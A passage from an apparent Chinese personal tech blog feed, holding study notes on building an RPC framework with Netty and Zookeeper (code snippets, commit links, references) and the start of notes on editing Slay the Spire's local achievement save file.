class="keyword">new</span> <span class="title class_">ServerBootstrap</span>()</span><br><span class="line">                .group(<span class="keyword">new</span> <span class="title class_">NioEventLoopGroup</span>())</span><br><span class="line">                .channel(NioServerSocketChannel.class)</span><br><span class="line">                .childHandler(<span class="keyword">new</span> <span class="title class_">ChannelInitializer</span>&lt;NioSocketChannel&gt;() &#123;</span><br><span class="line">                    <span class="meta">@Override</span></span><br><span class="line">                    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">initChannel</span><span class="params">(NioSocketChannel ch)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">                        <span class="type">ChannelPipeline</span> <span class="variable">pipeline</span> <span class="operator">=</span> ch.pipeline();</span><br><span class="line">                        pipeline.addLast(<span class="string">&quot;h1&quot;</span>, <span class="keyword">new</span> <span class="title class_">ChannelInboundHandlerAdapter</span>() &#123;</span><br><span class="line">                            <span class="meta">@Override</span></span><br><span class="line">                            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">channelRead</span><span class="params">(ChannelHandlerContext ctx, Object msg)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">                                System.out.println(<span class="string">&quot;Inbound1&quot;</span>);</span><br><span class="line">                                System.out.println();</span><br><span class="line">                                <span class="built_in">super</span>.channelRead(ctx, msg);</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;);</span><br><span class="line">                        pipeline.addLast(<span class="string">&quot;h2&quot;</span>, <span class="keyword">new</span> <span class="title class_">ChannelInboundHandlerAdapter</span>() &#123;</span><br><span class="line">                            <span class="meta">@Override</span></span><br><span class="line">                            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">channelRead</span><span class="params">(ChannelHandlerContext ctx, Object msg)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">                                System.out.println(<span class="string">&quot;Inbound2&quot;</span>);</span><br><span class="line">                                <span class="built_in">super</span>.channelRead(ctx, msg);</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;);</span><br><span class="line">                        pipeline.addLast(<span class="string">&quot;h3&quot;</span>, <span class="keyword">new</span> <span class="title class_">ChannelInboundHandlerAdapter</span>() &#123;</span><br><span class="line">                            <span class="meta">@Override</span></span><br><span class="line">                            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">channelRead</span><span class="params">(ChannelHandlerContext ctx, Object msg)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">                                System.out.println(<span class="string">&quot;Inbound3&quot;</span>);</span><br><span class="line">                                <span class="built_in">super</span>.channelRead(ctx, msg);</span><br><span class="line">                                ctx.writeAndFlush(ctx.alloc().buffer().writeBytes(<span class="string">&quot;server...&quot;</span>.getBytes()));</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;);</span><br><span class="line">                        pipeline.addLast(<span class="string">&quot;h4&quot;</span>, <span class="keyword">new</span> <span class="title class_">ChannelOutboundHandlerAdapter</span>() &#123;</span><br><span class="line">                            <span class="meta">@Override</span></span><br><span class="line">                            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">write</span><span class="params">(ChannelHandlerContext ctx, Object msg, ChannelPromise promise)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">                                System.out.println(<span class="string">&quot;Outbound4&quot;</span>);</span><br><span class="line">                                <span class="built_in">super</span>.write(ctx, msg, promise);</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;);</span><br><span class="line">                        pipeline.addLast(<span class="string">&quot;h5&quot;</span>, <span class="keyword">new</span> <span class="title class_">ChannelOutboundHandlerAdapter</span>() &#123;</span><br><span class="line">                            <span class="meta">@Override</span></span><br><span class="line">                            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">write</span><span class="params">(ChannelHandlerContext ctx, Object msg, ChannelPromise promise)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">                                System.out.println(<span class="string">&quot;Outbound5&quot;</span>);</span><br><span class="line">                                <span class="built_in">super</span>.write(ctx, msg, promise);</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;);</span><br><span class="line">                        pipeline.addLast(<span class="string">&quot;h6&quot;</span>, <span class="keyword">new</span> <span class="title class_">ChannelOutboundHandlerAdapter</span>() &#123;</span><br><span class="line">                            <span class="meta">@Override</span></span><br><span class="line">                            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">write</span><span class="params">(ChannelHandlerContext ctx, Object msg, ChannelPromise promise)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">                                System.out.println(<span class="string">&quot;Outbound6&quot;</span>);</span><br><span class="line">                                <span class="built_in">super</span>.write(ctx, msg, promise);</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;)</span><br><span class="line">                .bind(<span class="number">7999</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="相关知识学习篇"><a href="#相关知识学习篇" class="headerlink" title="相关知识学习篇"></a>相关知识学习篇</h2><h3 id="netty"><a href="#netty" class="headerlink" title="netty"></a>netty</h3><p>netty相关面试题：<a href="https://www.yuque.com/snailclimb/mf2z3k/wlr1b0">Netty 常见面试题总结 (yuque.com)</a></p>
<h3 id="spring源码"><a href="#spring源码" class="headerlink" title="spring源码"></a>spring源码</h3><p>讲得超级好的b站视频：<a href="https://www.bilibili.com/video/BV1tR4y1F75R">https://www.bilibili.com/video/BV1tR4y1F75R</a></p>
<p><a href="https://blog.csdn.net/demon7552003/article/details/107988310">Spring的@Configuration配置类-Full和Lite模式_full模式还是lite模式-CSDN博客</a></p>
<p><a href="https://blog.csdn.net/huangdi1309/article/details/121764438">ImportBeanDefinitionRegistrar作用原理介绍-CSDN博客</a></p>
<p><a href="https://zhuanlan.zhihu.com/p/30123517#:~:text=Import">动态注册bean，Spring官方套路：使用ImportBeanDefinitionRegistrar - 知乎 (zhihu.com)</a></p>
<p><a href="https://www.jianshu.com/p/d5ffdccc4f5d">Spring 的类扫描器分析 - ClassPathBeanDefinitionScanner - 简书 (jianshu.com)</a></p>
<p><a href="https://zhuanlan.zhihu.com/p/170578325#:~:text=mapper">mybatis mapper 接口注册流程源码解析 - 知乎 (zhihu.com)</a></p>
<p><a href="https://www.cnblogs.com/Xianhuii/p/17051837.html#:~:text=ClassP">深入理解ClassPathBeanDefinitionScanner - Xianuii - 博客园 (cnblogs.com)</a></p>
<p><a href="https://cloud.tencent.com/developer/article/1497799">【小家Spring】Spring容器加载Bean定义信息的两员大将：AnnotatedBeanDefinitionReader和ClassPathBeanDefinitionScanner-腾讯云开发者社区-腾讯云 (tencent.com)</a></p>
<p><a href="https://zhuanlan.zhihu.com/p/608825840">MyBatis 原理：扫描 Mapper 接口 - 知乎 (zhihu.com)</a></p>
<h3 id="SPI机制"><a href="#SPI机制" class="headerlink" title="SPI机制"></a>SPI机制</h3><h3 id="注解"><a href="#注解" class="headerlink" title="注解"></a>注解</h3><p><a href="https://blog.csdn.net/KingBoyWorld/article/details/105337011">Java注解入门到精通，这一篇就够了-CSDN博客</a></p>
<p><a href="https://www.cnblogs.com/binarylei/p/10415585.html#:~:text=Annota">Spring 注解（二）注解工具类 AnnotationUtils 和 AnnotatedElementUtils - binarylei - 博客园 (cnblogs.com)</a></p>
<h3 id="zookeeper"><a href="#zookeeper" class="headerlink" title="zookeeper"></a>zookeeper</h3><p><a href="https://www.bilibili.com/video/BV1M741137q">https://www.bilibili.com/video/BV1M741137q</a></p>
<p><a href="https://www.runoob.com/w3cnote/zookeeper-bs-command.html">7.0 Zookeeper 客户端基础命令使用 | 菜鸟教程 (runoob.com)</a></p>
<p><a href="https://blog.csdn.net/a1774381324/article/details/123699105">最新版Zookeeper常用命令总结（收藏吃灰系列）_golang zk创建永久节点-CSDN博客</a></p>
<p><a href="https://blog.csdn.net/CNpeaceful/article/details/135015770">Zookeeper篇——深入认识和学习Zookeeper节点-Znode，涵盖概念以及详细操作节点命令，保姆级教程，超详细、超全面！！！-CSDN博客</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root@e91dfa6b69fc:/apache-zookeeper-3.5.8-bin/bin# ./zkCli.sh -server localhost:2181</span><br><span class="line">quit</span><br><span class="line"></span><br><span class="line">docker exec -it e91dfa6b69fc /bin/bash</span><br></pre></td></tr></table></figure>



<h2 id="RPC完整代码学习"><a href="#RPC完整代码学习" class="headerlink" title="RPC完整代码学习"></a>RPC完整代码学习</h2><h2 id="RPC-框架设计"><a href="#RPC-框架设计" class="headerlink" title="RPC 框架设计"></a>RPC 框架设计</h2><p><a href="https://github.com/Snailclimb/guide-rpc-framework">Snailclimb&#x2F;guide-rpc-framework: A custom RPC framework implemented by Netty+Kyro+Zookeeper.（一款基于 Netty+Kyro+Zookeeper 实现的自定义 RPC 框架-附详细实现过程和相关教程。） (github.com)</a></p>
<p><a href="https://www.yuque.com/snailclimb/gsmusc/hc6nzg">03 如何自己实现一个RPC框架？ (yuque.com)</a>  密码：sztd</p>
<p> RPC 框架不仅要提供服务发现功能，还要提供负载均衡、容错等功能，这样的 RPC 框架才算真正合格的 -service、balance、tolerance</p>
<h2 id="实现篇"><a href="#实现篇" class="headerlink" title="实现篇"></a>实现篇</h2><p>个人实现篇（感觉光看代码并不知道实现的流程，感觉还是得看commit自己慢慢写得差不多，甚至改动才算掌握了）</p>
<p><a href="https://gitee.com/xiong-changchun/rpc-framework">rpc-framework: 手写rpc (gitee.com)</a></p>
<h3 id="初始化项目，编写最简单的server、client"><a href="#初始化项目，编写最简单的server、client" class="headerlink" title="初始化项目，编写最简单的server、client"></a>初始化项目，编写最简单的server、client</h3><p><a href="https://www.cnblogs.com/gonjan-blog/p/6685611.html">java动态代理实现与原理详细分析 - Gonjian - 博客园 (cnblogs.com)</a></p>
<p><a href="https://blog.csdn.net/euyy1029/article/details/52511773">@SuppressWarnings注解-CSDN博客</a></p>
<p><a href="https://www.cnblogs.com/yiwangzhibujian/p/7107785.html">【Socket】Java Socket编程基础及深入讲解 - 已往之不谏 - 博客园 (cnblogs.com)</a></p>
<p><a href="https://blog.csdn.net/Jzandth/article/details/109096862">SpringCloud(12) —— Feign:使用接口方式调用服务_springcould feign ipage null-CSDN博客</a></p>
<p>搭建好项目，分为下面对应几个模块：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;groupId&gt;com.xccstu&lt;/groupId&gt;</span><br><span class="line">&lt;artifactId&gt;rpc-framework&lt;/artifactId&gt;</span><br><span class="line">&lt;packaging&gt;pom&lt;/packaging&gt;</span><br><span class="line">&lt;version&gt;1.0-SNAPSHOT&lt;/version&gt;</span><br><span class="line">&lt;modules&gt;</span><br><span class="line">    &lt;module&gt;rpc-framework-core&lt;/module&gt;</span><br><span class="line">    &lt;module&gt;rpc-framework-simple&lt;/module&gt;</span><br><span class="line">    &lt;module&gt;hello-service-api&lt;/module&gt;</span><br><span class="line">    &lt;module&gt;example-client&lt;/module&gt;</span><br><span class="line">    &lt;module&gt;example-server&lt;/module&gt;</span><br><span class="line">    &lt;module&gt;rpc-framework-common&lt;/module&gt;</span><br><span class="line">&lt;/modules&gt;</span><br><span class="line"></span><br><span class="line">根据名字就可以看出来互相的作用</span><br></pre></td></tr></table></figure>

<p>对应commit：<a href="https://gitee.com/xiong-changchun/rpc-framework/commits/master">提交 · changchun&#x2F;rpc-framework - Gitee.com</a></p>
<h3 id="提取公共模块"><a href="#提取公共模块" class="headerlink" title="提取公共模块"></a>提取公共模块</h3><p>添加RpcResponse，common新增dto、enumeration包、exception，增加错误信息、返回状态码枚举</p>
<p><a href="https://blog.csdn.net/u011397981/article/details/119743032">【开发工具】IDEA生成序列号serialVersionUID快捷键_idea生成serialversionuid快捷键-CSDN博客</a></p>
<p>对应commit：<a href="https://gitee.com/xiong-changchun/rpc-framework/commit/a7cfbadab3b45c33e5e2a23203407c20c802ba4f">提取公共模块，在common包下增加dto、enum、exception包 · a7cfbad · changchun&#x2F;rpc-framework - Gitee.com</a></p>
<h3 id="之前的server只能注册一个service，使用map注册多个service"><a href="#之前的server只能注册一个service，使用map注册多个service" class="headerlink" title="之前的server只能注册一个service，使用map注册多个service"></a>之前的server只能注册一个service，使用map注册多个service</h3><p><a href="https://blog.csdn.net/hustzw07/article/details/71108945#:~:text=%E6%96%87%E7%AB%A0%E6%B5%8F%E8%A7%88%E9%98%85%E8%AF%BB">Java的getCanonicalName和getName_getcanonicalname getname-CSDN博客</a></p>
<p>对应commit：<a href="https://gitee.com/xiong-changchun/rpc-framework/commit/ee2755d822cb7623dcbbce45b58acf91b74e1aef">之前的server只能注册一个service，使用map注册多个service · ee2755d · changchun&#x2F;rpc-framework - Gitee.com</a></p>
<h3 id="使用netty、增加netty依赖、并且修改部分逻辑如增加序列化异常类"><a href="#使用netty、增加netty依赖、并且修改部分逻辑如增加序列化异常类" class="headerlink" title="使用netty、增加netty依赖、并且修改部分逻辑如增加序列化异常类"></a>使用netty、增加netty依赖、并且修改部分逻辑如增加序列化异常类</h3><p>[序列化-Kryo的使用详解-CSDN博客](<a href="https://blog.csdn.net/w727655308/article/details/121879000#:~:text=%E5%BC%95%E5%85%A5">https://blog.csdn.net/w727655308/article/details/121879000#:~:text=引入</a> mav#:~:text&#x3D;引入 mav)</p>
<p><a href="https://blog.csdn.net/hustzw07/article/details/71108945">Java的getCanonicalName和getName_getcanonicalname getname-CSDN博客</a></p>
<p><a href="https://blog.csdn.net/qq_51788416/article/details/119795887">IDEA 最新版找不到allow parallel run 如何打开多个控制台的解决方案-CSDN博客</a></p>
<p><a href="https://www.jianshu.com/p/0bff7c020af2">Netty：option和childOption参数设置说明 - 简书 (jianshu.com)</a></p>
<p><a href="https://blog.csdn.net/seawaving/article/details/122601043#:~:text=Channe#:~:text=Channe">netty最常用两个处理器父类ChannelInboundHandlerAdapter和SimpleChannelInboundHandler区别与使用-CSDN博客</a></p>
<p><a href="https://blog.csdn.net/zhengchao1991/article/details/103583766">一文搞懂Netty中Handler的执行顺序-CSDN博客</a></p>
<p>对应commit：<a href="https://gitee.com/xiong-changchun/rpc-framework/commit/8deedcc37e973e0a6e9b7f46dc1eed7784f73837">使用netty、增加netty依赖、并且修改部分逻辑如增加序列化异常类 · 8deedcc · changchun&#x2F;rpc-framework - Gitee.com</a></p>
<h3 id="在com-xccstu-transport-netty-下面在细分了client、server、codec包"><a href="#在com-xccstu-transport-netty-下面在细分了client、server、codec包" class="headerlink" title="在com.xccstu.transport.netty 下面在细分了client、server、codec包"></a>在com.xccstu.transport.netty 下面在细分了client、server、codec包</h3><p>对应commit：<a href="https://gitee.com/xiong-changchun/rpc-framework/commit/24795bfe5241e0fc8655947a09ba8c9eb3e6de4a">在com.xccstu.transport.netty 下面在细分了client、server、codec包 · 24795bf · changchun&#x2F;rpc-framework - Gitee.com</a></p>
<h3 id="增加线程池和请求体中的RequestID"><a href="#增加线程池和请求体中的RequestID" class="headerlink" title="增加线程池和请求体中的RequestID"></a>增加线程池和请求体中的RequestID</h3><p><a href="https://github.com/Snailclimb/guide-rpc-framework/compare/a6028b87b0fc4c59d7319e932e8a339abe0bbff8..df21fdeaca63946f87a0e80b12db3e84cdec74e5">Comparing a6028b87b0fc4c59d7319e932e8a339abe0bbff8..df21fdeaca63946f87a0e80b12db3e84cdec74e5 · Snailclimb&#x2F;guide-rpc-framework (github.com)</a></p>
<p><a href="https://blog.csdn.net/liuyu973971883/article/details/107947496">Java高并发编程中Executor、ExecutorService的使用及详细介绍-刘宇_executor 使用 executorservice-CSDN博客</a></p>
<p><a href="https://docs.github.com/zh/pull-requests/committing-changes-to-your-project/viewing-and-comparing-commits/comparing-commits">比较提交 - GitHub 文档</a></p>
<p><a href="https://wizardforcel.gitbooks.io/guava-tutorial/content/1.html">Google Guava官方教程（中文版） | Google Guava 中文教程 (gitbooks.io)</a></p>
<p><a href="https://blog.csdn.net/qq_38893133/article/details/108377331">使用ThreadFactoryBuilder创建线程池_guava的threadfactorybuilder-CSDN博客</a></p>
<p>使用ThreadFactoryBuilder创建线程池，common模块增加com.xccstu.utils.concurrent包、提取出了RpcMessageChecker统一检查rpc请求的返回</p>
<p>对应commit：<a href="https://gitee.com/xiong-changchun/rpc-framework/commit/3afbf2be25a801ef06b8c3f735a7de407fe86bb4">增加线程池和请求体中的RequestID 以及优化了下pom · 3afbf2b · changchun&#x2F;rpc-framework - Gitee.com</a></p>
<h3 id="增加了断言以及修改了RpcRequestHandler中的handle方法（之后通过注册中心获取到目标类）"><a href="#增加了断言以及修改了RpcRequestHandler中的handle方法（之后通过注册中心获取到目标类）" class="headerlink" title="增加了断言以及修改了RpcRequestHandler中的handle方法（之后通过注册中心获取到目标类）"></a>增加了断言以及修改了RpcRequestHandler中的handle方法（之后通过注册中心获取到目标类）</h3><p>使用 assert 断言，需要在 VM options 添加参数：-ea</p>
<p>但我感觉还不如直接写测试文件</p>
<p>对应commit：<a href="https://gitee.com/xiong-changchun/rpc-framework/commit/03fcfd1765224c66f686a42a83d6703908b53a2c">增加了断言以及修改了RpcRequestHandler中的handle方法（之后通过注册中心获取到目标类） · 03fcfd1 · changchun&#x2F;rpc-framework - Gitee.com</a></p>
<h3 id="增加客户端重试机制"><a href="#增加客户端重试机制" class="headerlink" title="增加客户端重试机制"></a>增加客户端重试机制</h3><p><a href="https://blog.csdn.net/liu_da_da/article/details/124983187#:~:text=%E4%B8%80%E3%80%81%E4%BB%80%E4%B9%88%E6%98%AFc">CountDownLatch详解以及用法示例-CSDN博客</a></p>
<p><a href="https://blog.csdn.net/small_love/article/details/111058977#:~:text=Atomic">并发编程 — 原子类 AtomicReference 详解-CSDN博客</a></p>
<p>关键代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">connect</span><span class="params">(Bootstrap bootstrap, InetSocketAddress inetSocketAddress, <span class="type">int</span> retry, CountDownLatch countDownLatch)</span> &#123;</span><br><span class="line">    bootstrap.connect(inetSocketAddress).addListener((ChannelFutureListener) future -&gt; &#123;</span><br><span class="line">        <span class="keyword">if</span> (future.isSuccess()) &#123;</span><br><span class="line">            logger.info(<span class="string">&quot;客户端连接成功!&quot;</span>);</span><br><span class="line">            channel = future.channel();</span><br><span class="line">            countDownLatch.countDown();</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (retry == <span class="number">0</span>) &#123;</span><br><span class="line">            logger.error(<span class="string">&quot;客户端连接失败:重试次数已用完，放弃连接！&quot;</span>);</span><br><span class="line">            countDownLatch.countDown();</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RpcException</span>(RpcErrorMessageEnum.CLIENT_CONNECT_SERVER_FAILURE);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 第几次重连</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">order</span> <span class="operator">=</span> (MAX_RETRY_COUNT - retry) + <span class="number">1</span>;</span><br><span class="line">        <span class="comment">// 本次重连的间隔</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">delay</span> <span class="operator">=</span> <span class="number">1</span> &lt;&lt; order;</span><br><span class="line">        logger.error(<span class="string">&quot;&#123;&#125;: 连接失败，第 &#123;&#125; 次重连……&quot;</span>, <span class="keyword">new</span> <span class="title class_">Date</span>(), order);</span><br><span class="line">        bootstrap.config().group().schedule(() -&gt; connect(bootstrap, inetSocketAddress, retry - <span class="number">1</span>, countDownLatch), delay, TimeUnit</span><br><span class="line">                .SECONDS);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>使用schedule控制重新连接的间隔，重试次数越多间隔越长</p>
<p>对应commit：<a href="https://gitee.com/xiong-changchun/rpc-framework/commit/29ff40d171f58df24edd950f9070b52df9fa3781">增加客户端重试机制 · 29ff40d · changchun&#x2F;rpc-framework - Gitee.com</a></p>
<p>……</p>
<h3 id="总结-如果让我重写代码，我会按怎样的顺序实现代码"><a href="#总结-如果让我重写代码，我会按怎样的顺序实现代码" class="headerlink" title="总结-如果让我重写代码，我会按怎样的顺序实现代码"></a>总结-如果让我重写代码，我会按怎样的顺序实现代码</h3><h2 id="相关功能讲解"><a href="#相关功能讲解" class="headerlink" title="相关功能讲解"></a>相关功能讲解</h2><h3 id="sping扫描自定义组件"><a href="#sping扫描自定义组件" class="headerlink" title="sping扫描自定义组件"></a>sping扫描自定义组件</h3><p><a href="https://www.cnblogs.com/gstsyyb/p/17962233">如何让spring扫描到自定义注解的组件 - gstsyyb - 博客园</a></p>
<h2 id="面试题"><a href="#面试题" class="headerlink" title="面试题"></a>面试题</h2><p><a href="https://zhuanlan.zhihu.com/p/644047546">烂大街的 RPC 项目，如何和字节面试官聊出花儿来？ - 知乎 (zhihu.com)</a></p>
<p><a href="https://www.nowcoder.com/discuss/363694300083879936">远程服务调用（RPC）高频面试题！(有RPC项目必看！)_牛客网 (nowcoder.com)</a></p>
<p><a href="https://www.nowcoder.com/discuss/353157479641063424">(近)万字总结，RPC 项目相关问题及解答_牛客网 (nowcoder.com)</a></p>
]]></content>
      <tags>
        <tag>项目</tag>
        <tag>轮子</tag>
      </tags>
  </entry>
  <entry>
    <title>slay_the_spire</title>
    <url>/2023/04/16/slay-the-spire/</url>
    <content><![CDATA[<p><a href="https://tieba.baidu.com/p/7717284033">【图片】杀戮尖塔安卓与PC端存档文件简介_杀戮尖塔吧_百度贴吧 (baidu.com)</a></p>
<p>参考<a href="https://www.52pojie.cn/forum.php?mod=viewthread&tid=1541057&highlight=%C9%B1%C2%BE%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BDhttps://www.52pojie.cn/forum.php?mod=viewthread&tid=1541057&highlight=%C9%B1%C2%BE%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD">写一个杀戮尖塔存档修改器 - 『编程语言区』 - 吾爱破解 - LCG - LSG |安卓破解|病毒分析|www.52pojie.cn</a></p>
<p><a href="https://www.bilibili.com/read/cv18587141/">杀戮尖塔(Slay the Spire)控制台指南（包括所有卡牌、遗物、药水、荒疫等中英对照） - 哔哩哔哩 (bilibili.com)</a></p>
<p><a href="https://sts.huijiwiki.com/wiki/%E6%88%90%E5%B0%B1">成就 - 杀戮尖塔&#x2F;尖塔奇兵（Slay the Spire）中文维基|攻略百科|考据资料|Steam - 灰机wiki (huijiwiki.com)</a></p>
<p><a href="https://www.bilibili.com/video/BV1PZ4y1v72F/?spm_id_from=333.788.recommend_more_video.-1&vd_source=d1cb46e12f3981bbb347ae0eb3b44edd">【杀戮尖塔】手机版资源获取（简介和评论区自取）_手机游戏热门视频 (bilibili.com)</a></p>
<p>开个坑，也算是学学代码。</p>
<p>直接全成就</p>
<span id="more"></span>

<h2 id="start"><a href="#start" class="headerlink" title="start"></a>start</h2><h3 id="整体结构分析"><a href="#整体结构分析" class="headerlink" title="整体结构分析"></a>整体结构分析</h3><p><img src="https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230416113151438.png" alt="image-20230416113151438"></p>
<h4 id="preferences"><a href="#preferences" class="headerlink" title="preferences"></a>preferences</h4><p>steam_autocloud.vdf:存appid的没啥用</p>
<p>STSAchievements：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;GUARDIAN&quot;</span><span class="punctuation">:</span> <span class="string">&quot;true&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;GHOST_GUARDIAN&quot;</span><span class="punctuation">:</span> <span class="string">&quot;true&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;ADRENALINE&quot;</span><span class="punctuation">:</span> <span class="string">&quot;true&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;COME_AT_ME&quot;</span><span class="punctuation">:</span> <span class="string">&quot;true&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;AUTOMATON&quot;</span><span class="punctuation">:</span> <span class="string">&quot;true&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;PERFECT&quot;</span><span class="punctuation">:</span> <span class="string">&quot;true&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;COLLECTOR&quot;</span><span class="punctuation">:</span> <span class="string">&quot;true&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;SHAPES&quot;</span><span class="punctuation">:</span> <span class="string">&quot;true&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;SAPPHIRE&quot;</span><span class="punctuation">:</span> <span class="string">&quot;true&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;ASCEND_0&quot;</span><span class="punctuation">:</span> <span class="string">&quot;true&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;TIME_EATER&quot;</span><span class="punctuation">:</span> <span class="string">&quot;true&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;SLIME_BOSS&quot;</span><span class="punctuation">:</span> <span class="string">&quot;true&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;POWERFUL&quot;</span><span class="punctuation">:</span> <span class="string">&quot;true&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;CHAMP&quot;</span><span class="punctuation">:</span> <span class="string">&quot;true&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;INFINITY&quot;</span><span class="punctuation">:</span> <span class="string">&quot;true&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;YOU_ARE_NOTHING&quot;</span><span class="punctuation">:</span> <span class="string">&quot;true&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;CROW&quot;</span><span class="punctuation">:</span> <span class="string">&quot;true&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;AMETHYST&quot;</span><span class="punctuation">:</span> <span class="string">&quot;true&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;RUBY&quot;</span><span class="punctuation">:</span> <span class="string">&quot;true&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;THE_PACT&quot;</span><span class="punctuation">:</span> <span class="string">&quot;true&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;IMPERVIOUS&quot;</span><span class="punctuation">:</span> <span class="string">&quot;true&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;PLAGUE&quot;</span><span class="punctuation">:</span> <span class="string">&quot;true&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;CATALYST&quot;</span><span class="punctuation">:</span> <span class="string">&quot;true&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;EMERALD&quot;</span><span class="punctuation">:</span> <span class="string">&quot;true&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;AMETHYST_PLUS&quot;</span><span class="punctuation">:</span> <span class="string">&quot;true&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;RUBY_PLUS&quot;</span><span class="punctuation">:</span> <span class="string">&quot;true&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;ASCEND_10&quot;</span><span class="punctuation">:</span> <span class="string">&quot;true&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;JAXXED&quot;</span><span class="punctuation">:</span> <span class="string">&quot;true&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;SPEED_CLIMBER&quot;</span><span class="punctuation">:</span> <span class="string">&quot;true&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;TRANSIENT&quot;</span><span class="punctuation">:</span> <span class="string">&quot;true&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;BARRICADED&quot;</span><span class="punctuation">:</span> <span class="string">&quot;true&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;EMERALD_PLUS&quot;</span><span class="punctuation">:</span> <span class="string">&quot;true&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;PURITY&quot;</span><span class="punctuation">:</span> <span class="string">&quot;true&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;MINIMALIST&quot;</span><span class="punctuation">:</span> <span class="string">&quot;true&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;ASCEND_20&quot;</span><span class="punctuation">:</span> <span class="string">&quot;true&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>存成就的（只有完成的才会在这里显示），之后测试下是否可以直接修改。达成全成就。</p>
<p>网上找到的，测试下能否直接全成就</p>
